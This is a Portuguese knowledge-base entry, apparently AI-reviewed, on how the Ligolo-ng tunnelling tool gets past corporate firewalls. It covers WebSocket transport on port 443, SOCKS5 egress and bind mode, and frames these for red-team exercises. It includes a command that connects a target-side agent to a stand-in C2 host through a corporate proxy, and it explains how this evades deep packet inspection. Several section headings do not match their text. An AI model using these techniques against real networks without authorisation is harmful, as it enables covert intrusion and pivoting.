---
id: software.seguranca.tranche16.001567
tipo: tecnica
dominio: software
subdominio: seguranca
nivel: intermediario
confianca: media
ultima_verificacao: 2026-10-03
validade: volatil
status: candidata
revisao_humana: nao_solicitada
revisor: ""
revisao_ia: aprovada
revisor_ia: "Arena.ai Agent Mode"
data_revisao_ia: 2026-10-03
relatorio_revisao_ia: "knowledge-federation/exports/reports/ai-review-software-seguranca-2000-0003-tranche-16.md"
fontes: ["https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/README.md", "https://docs.ligolo.ng/Quickstart/"]
tags: [dominio/software, subdominio/seguranca, qualidade/candidata]
lote: software-seguranca-2000-0003
---

# Atravessando Proxies Corporativos e Firewalls no Ligolo-ng: **Suporte a WebSockets (`ws://` / `wss://`)**, Proxy de Saída (**`--socks`**) e **Modo Bind**

## Em uma frase
E quando o servidor onde você executou o `agent` do Ligolo-ng está atrás de um firewall corporativo que bloqueia a porta `11601` (permitindo apenas tráfego Web `HTTP/HTTPS` ou exigindo saída via proxy **SOCKS5**), ou quando pelo contrário é o seu `proxy` que consegue iniciar conexão direta para o `agent` (**Bind Mode**)?

## Por que importa
O Ligolo-ng cobre todos esses cenários nativamente: **(1) Transporte sobre WebSockets (`ws://` ou `wss://` na porta `443`)** — em vez de TLS bruto na porta `11601`, o túnel inteiro trafega encapsulado em WebSockets sobre HTTPS.

## Como funciona
**(2) Saída via Proxy SOCKS5 (`--socks ip:port --socks-user ... --socks-pass ...`)** documentada no `Quickstart`; e **(3) Modo Bind (Conexão Direta `Proxy -> Agent`)** quando o host alvo tem porta acessível mas bloqueia conexões de saída!

## Exemplo
```bash
# Conectar o agent do Ligolo-ng atravessando um proxy SOCKS5 corporativo com autenticacao e validacao de fingerprint SHA-256
./agent \
  -connect c2.exemplo.br:443 \
  --socks 10.10.1.5:1080 \
  --socks-user "corp_user" \
  --socks-pass "${SOCKS_PASS}" \
  -accept-fingerprint "${LIGOLO_FP}"
```

## Limites e trade-offs
Por que o suporte a **WebSockets (`wss://`)** na porta `443` combinado com certificado **Let's Encrypt (`-autocert`)** ou certificado corporativo no Ligolo-ng é tão importante em exercícios de Red Team? Porque firewalls Next-Generation (NGFW) com **Application Control / Deep Packet Inspection** frequentemente bloqueiam conexões TLS em portas altas (`11601`) ou protocolos binários desconhecidos, mas permitem conexões `HTTPS + WebSocket` para domínios com certificado TLS válido!

## Como verificar
Quando uma sessão não for mais necessária ou ao encerrar o exercício, use o comando **`kill`** no console do Ligolo-ng (`v0.8+`) para encerrar remotamente o processo do `agent` na máquina alvo de forma limpa.

## Conexões
- [[ligolo-boas-praticas-nmap-unprivileged-pe-traducao-syn-connect-gvisor]] — Veja também: Por Que Usar **`nmap --unprivileged`** (ou `-sT -Pn`) Através do Ligolo-ng? Entendendo a Tradução de Pacotes `SYN` e `ICMP` no `gVisor` do Agente.
- [[ligolo-multiplos-tuneis-simultaneos-segmentacao-interfaces-tun-paralelas]] — Veja também: Operando **Múltiplos Túneis Simultâneos** para Diferentes Sub-Redes no Ligolo-ng: Uma Interface **`TUN`** Dedicada por Agente.
- [[ligolo-arquitetura-tunelamento-camada-3-tun-gvisor-sem-socks]] — Referência cruzada direta com ligolo-arquitetura-tunelamento-camada-3-tun-gvisor-sem-socks.
- [[ligolo-configuracao-tls-autocert-selfcert-fingerprint-pinning]] — Referência cruzada direta com ligolo-configuracao-tls-autocert-selfcert-fingerprint-pinning.
- [[chisel-atravessando-proxies-corporativos-socks-http-connect-stdio-ssh]] — Referência cruzada direta com chisel-atravessando-proxies-corporativos-socks-http-connect-stdio-ssh.

## Fontes
- [Ligolo-ng Official GitHub Repository (`nicocha30/ligolo-ng`)](https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/README.md) — repositório oficial do túnel de Camada 3 Ligolo-ng cobrindo arquitetura `TUN` + `gVisor` sem privilégios no agente, performance e recomendações `--unprivileged` para Nmap; consultado em 2026-10-03.
- [Ligolo-ng Official Quickstart & Setup Documentation (`docs.ligolo.ng/Quickstart`)](https://docs.ligolo.ng/Quickstart/) — documentação oficial do Ligolo-ng detalhando criação de interfaces `interface_create`, `certificate_fingerprint`/`-accept-fingerprint`, `session`, `ifconfig`, `interface_add_route` e `tunnel_start`; consultado em 2026-10-03.
